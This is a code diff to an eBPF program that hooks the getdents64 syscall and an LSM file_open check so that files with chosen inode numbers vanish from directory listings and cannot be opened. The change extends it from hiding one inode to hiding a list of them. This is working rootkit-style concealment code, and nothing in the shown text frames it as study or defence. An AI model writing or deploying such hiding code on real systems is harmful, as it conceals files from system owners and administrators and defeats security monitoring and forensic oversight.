@@ -59,7 +59,8 @@ struct {
     __type(value, __u32); // Program FD
 } prog_array SEC(".maps");
 
-const volatile uint64_t inode_to_hide = 0;
+const volatile uint64_t inodes_to_hide[INODES_TO_HIDE_LEN] = {0};
+const volatile size_t inodes_to_hide_len = 0;
 
 SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter * ctx) {
@@ -117,11 +118,18 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit * ctx) {
             break;
 
         // Check if we found target inode
-        if (inode_to_hide == inode) {
-            // Go to the handle_getdents_patch function
-            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
-            bpf_map_delete_elem(&map_buffs, &pid_tgid);
-            bpf_tail_call(ctx, &prog_array, PROG_02);
+        for (size_t i = 0; i < INODES_TO_HIDE_LEN; i++) {
+            // Don't waste cycles if inode wasn't set
+            if (i == inodes_to_hide_len)
+                break;
+
+            if (inodes_to_hide[i] == inode) {
+                // Go to the handle_getdents_patch function
+                bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+                bpf_map_delete_elem(&map_buffs, &pid_tgid);
+                bpf_tail_call(ctx, &prog_array, PROG_02);
+                break;
+            }
         }
 
         // Move to next entry
@@ -194,8 +202,13 @@ SEC("lsm/file_open")
 int BPF_PROG(trace_file_open, struct file * file) {
     u64 inode = file->f_inode->i_ino;
 
-    if (inode_to_hide == inode) {
-        return -ENOENT;
+    for (size_t i = 0; i < INODES_TO_HIDE_LEN; i++) {
+        // Don't waste cycles if inode wasn't set
+        if (i == inodes_to_hide_len)
+            break;
+
+        if (inodes_to_hide[i] == inode)
+            return -ENOENT;
     }
 
     return 0;
